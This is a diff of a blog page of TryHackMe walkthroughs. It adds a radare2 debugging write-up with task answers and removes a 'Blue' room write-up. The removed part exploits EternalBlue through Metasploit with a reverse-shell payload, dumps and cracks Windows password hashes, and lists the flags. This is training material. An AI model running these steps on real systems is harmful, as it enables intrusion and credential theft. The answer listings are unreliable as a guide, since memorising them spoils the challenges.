@@ -129,6 +129,252 @@ y"
 
 "r2 -d if2"
 
+"aa"
+
+"pdf @main"
+
+alright
+
+<img src="/images/TryHackMe/IntroTox86/1.PNG">
+
+We see that I need to put a stop at 0x55ecb353f637 to find the value of var_8h before popq
+
+"db 0x55ecb353f637"
+
+"dc"
+
+We now use "px @rbp-0x8" since we need that var (var_8h)
+
+<img src="/images/TryHackMe/IntroTox86/Task 4-1.PNG">
+
+We can see here that the offset is 60; If we convert this on any website such as
+[Hex To Decimal](https://www.rapidtables.com/convert/number/hex-to-decimal.html)
+
+60=96 in decimal
+
+***96*** is the answer to Task 4 # 1!
+
+for #2 we need to check (var_ch)
+
+"px @rbp=0xc"
+
+<img src="/images/TryHackMe/IntroTox86/Task 4-2-Done.PNG">
+
+This shows "00" as the offset which is ***0*** for #2!
+
+For #3 we need to check (var_4h)
+
+"px @rbp-0x4"
+
+<img src="/images/TryHackMe/IntroTox86/Task 4-3-Done.PNG">
+
+This shows "01" which is just ***1*** for #3!
+
+For #4 we already have the info
+
+<img src="/images/TryHackMe/IntroTox86/Task 4-4-Done.PNG">
+
+***&*** (and) is the sign used for #4!
+
+we can now leave with 
+
+"exit"
+
+"y"
+
+"y"
+
+Time for Task 5!
+
+For this Task we need to go to the loops folder
+
+"cd"
+
+"cd loops"
+
+"r2 -d loop1"
+
+"aaa"
+
+"af1"
+
+Now it wants us to set a break at the jump instruction location
+
+For me that was 
+
+"db  0x55bf4fd8a613"
+
+"ds"
+***(I later realized I did ds not dc)***
+"pdf @main"
+
+This was the point it stopped working well so lets just jump to the challenge!
+
+"r2 -d loop2"
+
+"aaa"
+
+"af"
+
+"pdf @main"
+
+<img src="/images/TryHackMe/IntroTox86/Task 5 Info.PNG">
+
+
+For #1 we need to find out the value of (var_8h) on the second iteration of the loop
+
+"db 0x559d7730162f" breakpoint @ cmpl value
+
+"dc"
+
+"dc"
+
+"dc"
+
+We have to run it 3 times due to an unconditional jump for the firstr loop
+
+"pdf @main"
+
+<img src="/images/TryHackMe/IntroTox86/Task 5-1.PNG">
+
+Our value is "05" which is ***5*** for #1
+
+#2 needs the value of (var_ch)
+
+"px @rbp-0xc"
+
+<img src="/images/TryHackMe/IntroTox86/Task 5-2.PNG">
+
+***0*** is our answer for #2
+
+Now we need to get t o the end of the program!
+
+"dc"
+
+"dc"
+
+We did not have any breakpoints so lets see if we are done by checking for our answers
+
+"px @rbp-0x8"
+
+<img src="/images/TryHackMe/IntroTox86/Task 5 Error.PNG">
+
+Uhhhh... Red is bad right?
+
+"exit'
+
+"y"
+
+"y"
+
+"r2 -d loop2"
+
+"aaa"
+
+"pdf @main"
+
+<img src="/images/TryHackMe/IntroTox86/Task 5 Info2.PNG">
+
+For questions 3 and 4 we need to get to the end of the program
+
+Lets plop a break in at the popq since I think that retq in red was the issue
+
+"db 0x555b4db0763a"
+
+"dc"
+
+"px @rbp-0x8"
+
+<img src="/images/TryHackMe/IntroTox86/Task 5-3.PNG">
+
+02=***2*** for #3
+
+Now for the final part of task 5
+
+"px @rbp-0xc"
+
+<img src="/images/TryHackMe/IntroTox86/Task 5-4.PNG">
+
+Would you believe me if I said it worked? ***0*** is the answer to #4
+
+"exit"
+
+"y"
+
+"y"
+
+"cd"
+
+Time for Task 6!!!!
+
+Now we get to test what we have learned
+
+"cd crackme"
+
+"r2 -d crackme1"
+
+"aaa"
+
+"pdf @main"
+
+<img src="/images/TryHackMe/IntroTox86/Task 6 Info.PNG">
+
+Lets put a break in right before the wrong password message
+
+"db 0x55ebec5da8b4"
+
+"dc"
+
+I put in a blank password and then hit the break
+
+Lets check some of the variables
+
+(nothing worked)
+
+Lets look further at this
+
+Lets try @ the Wrong password spot
+
+(I had to reload the code)
+
+"db 0x563b599378b6"
+
+"dc"
+
+"pdf @main"
+
+Now lets check some more variables
+
+"px @rbp-0x54"
+
+This shows my password! 
+
+<img src="/images/TryHackMe/IntroTox86/Task 6 Info2.PNG">
+
+Lets keep trying the list
+
+"px @rbp-0x50"
+
+(only saw my password)
+
+Lets go to that bold call above us
+
+(restarted the code again)
+
+"pdf @main
+
+<img src="/images/TryHackMe/IntroTox86/Task 6 Info3.PNG">
+
+"db 0x55ffe0cf38a4"
+
+"dc"
+
+"pdf @main"
+
+Lets check the variables again
+
+"px @rbp-0x54"
+(fails across the board only my password)
 
 
 
@@ -136,221 +382,35 @@ y"
 
 
 
+Task 7!
 
+"r2 -d crackme2"
 
+"aaa"
 
+pdf @main"
 
+This shows a file in the home directory!
 
+"exit"
 
+"y"
 
+"y"
 
+"cd"
 
+"cd install-files"
 
+"cat secret.txt"
 
+After reading is discord of the text being backwards I knew to quickly what it was
 
+<img src="/images/TryHackMe/IntroTox86/Task 7.PNG">
 
+***dwperuc3sv*** for Task 7!
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-I used this page to help learn more Nmap commands maybe you can to!
 <br/><br/>
-https://www.stationx.net/nmap-cheat-sheet/
-<br/><br/>
-Start the machine and the connect using your Open VPN
-<br/><br/>
-Run "nmap *IP of Active machine*" to scan 1000 common ports
-<br/><br/>
-<img src="/images/TryHackMe/Blue/Blue-Port Count.PNG">
-<br/><br/>
-We now have the first Flag!
-<br/>
-**"3"** is the number of open ports under 1000
-<br/><br/>
-Now we need to see what the machine is vulnerable to
-<br/><br/>
-lets run a quick command on those 3 ports
-<br/><br/>
-"nmap --script vuln -p *IP of Active machine* -v"
-<br/><br/>
-"--script vuln" will load in scripts to scan on the target IP/Ports
-<br/>
-"-p 135-445" will scan ports 135-445 with those vulnerability script
-<br/>
-"-v" increases the verbosity *adds more words* (you can use -vv for a greater effect)
-<br/><br/>
-<img src="/images/TryHackMe/Blue/Blue-MS17.PNG">
-<br/><br/>
-Now we have our final flag of task 1!
-<br/><br/>
-in our command we see **"ms17-010"** it even shows the disclosure date right below the red box
-<br/><br/>
-<br/><br/>
-**TASK 2**
-<br/><br/>
-We will need to use Metasploit for this portion
-<br/><br/>
-Lets run "msfdb init" (MetaSploit Framework DataBase Initialize)
-<br/><br/>
-Now lets run "msfconsole"
-<br/><br/>
-Once we get our ASCII art we can run the next command
-<br/><br/>
-"search ms17-010"
-<br/><br/>
-This will show several options but since weknow we have a Windows machine we can try those first
-<br/><br/>
-"use 2" will choose the second choice
-<br/>
-<img src="/images/TryHackMe/Blue/Task 2-2.PNG">
-<br/>
-**"exploit/windows/smb/ms17_010_eternalblue"** is the answer for the full path of the code
-<br/><br/>
-Next up "Set RHOSTS *IP of Active machine*"
-<br/>
-<img src="/images/TryHackMe/Blue/Task 2-3.PNG">
-<br/>
-**"RHOSTS"** is the answer for the name of the value
-<br/><br/>
-We will also need to set the LHOSTS to tun0
-<br/><br/>
-"set LHOST tun0" due to using a vpn
-<br/><br/>
-"show options" will show all the required areas are now done
-<br/><br/>
-The room wants us to use "set payload windows/x64/shell/reverse_tcp" before we do the next step
-<br/><br/>
-all we have to do now is type "run"
-<br/><br/>
-No we are in! (You may need to press enter) 
-<br/><br/>
-**TASK 3**
-<br/><br/>
-Type "whoami" to see if we are now connected as "nt authority\system"
-<br/><br/>
-place this session in the background with "ctrl+Z"
-<br/><br/>
-now we need to search for shell_to_meterpreter
-<br/><br/>
-"search shell_to_meterpreter"
-<br/><br/>
-We now see the answer to a question!
-<br/><br/>
-<img src="/images/TryHackMe/Blue/Task 3-1.PNG">
-"**post/multi/manage/shell_to_meterpreter**"
-<br/><br/>
-Now lets use what we found
-<br/><br/>
-"use post/multi/manage/shell_to_meterpreter"
-<br/><br/>
-<img src="/images/TryHackMe/Blue/Task 3-2.PNG">
-use "show options" and we see we need to change "**Session**"
-<br/><br/>
-now we need to set our session
-<br/><br/>
-use "sessions" to find your sessions #
-<br/><br/>
-"set session *Session #*"
-<br/><br/>
-once that is done type "sessions" and it should have new information under "Information"
-<br/><br/>
-type "session *session #*
-<br/><br/>
-now it should show "meterpreter" on the current line
-<br/><br/>
-try using "shell" and then "whoami" to see if we are system
-<br/><br/>
-press "ctrl+z" to get back to meterpreter
-<br/><br/>
-Now lets look at processes w/ "ps"
-<br/><br/>
-now we need to try and migrate to one of these processes
-<br/><br/>
-I used "migrate 2536" to go to svchost.exe but your masy be different
-<br/><br/>
-**TASK 4**
-<br/><br/>
-Now we get to play with hashes!
-<br/><br/>
-"hashdump" will give us 3 hashes
-<br/><br/>
-<img src="/images/TryHackMe/Blue/Task 4-1.PNG">
-"**Jon**" is the answer to 1 question of Task 4
-<br/><br/>
-if you google "windows password hash format" you will see they are either LM or NTLM
-<br/><br/>
-Lets try to crack all 3 with hashcat!
-<br/><br/>
-Lets save them as a document named "Bluehashes.txt"
-<br/><br/>
-you will need world lists for hashcat. I already had a "rockyou" list so I will use that
-<br/><br/>
-for hashcat we will use "sudo hashcat -a 0 -m 1000 Bluehashes.txt rockyou.wordlist --force --username --show > Hashed.txt"
-<br/><br/>
--a is for the attack mode 0, -m 1000 is for the NTLM hash format, --force is for if you do not have a Intel OpenCL runtime, --username ignores the username, > Hashed.txt names a file with the output
-<br/><br/>
-<img src="/images/TryHackMe/Blue/Task 4-2.PNG">
-<br/>
-In that new file at the end of Jons line is "**alqfna22**"
-<br/><br/>
-**TASK 5**
-<br/><br/>
-Now we need to find flags
-<br/><br/>
-"Flag1? This flag can be found at the system root."
-<br/><br/>
-"ls C:\\ will list the root
-<br/><br/>
-we now see "flag1.txt"
-<br/><br/>
-lets cat it!
-<br/><br/>
-"cat flag1.txt"
-<br/><br/>
-<img src="/images/TryHackMe/Blue/Task 5-1.PNG">
-"**flag{access_the_machine}**"
-<br/><br/>
-The second flag is where passwords are stored which would be "C:/windows/system32/config"
-<br/><br/>
-"cd C:/Windows/System32/Config"
-<br/><br/>
-"dir"
-<br/><br/>
-Will show us there is a "flag2.txt"
-<br/><br/>
-<img src="/images/TryHackMe/Blue/Task 5-2.PNG">
-<br/>
-"**flag{sam_database_elevated_access}**"
-<br/>
-We now have 2 of the 3 flags!
-<br/><br/>
-For the final flag we don't have much context so lets search instead
-<br/><br/>
-"search -f flag*.txt" should work
-<br/><br/>
-We now see a flag3.txt in Jons documents 
-<br/>
-<img src="/images/TryHackMe/Blue/Task 5-3.PNG">
-<br/>
-"**flag{admin_documents_can_be_valuable}**"
-<br/><br/>
-We have finally succeeded in the room!
+We are done... Beaten and broken but we are done.
 <br/><br/>
 [TryHackMe Directory](https://zacvr.github.io/Tutorials/TryHackMe/)
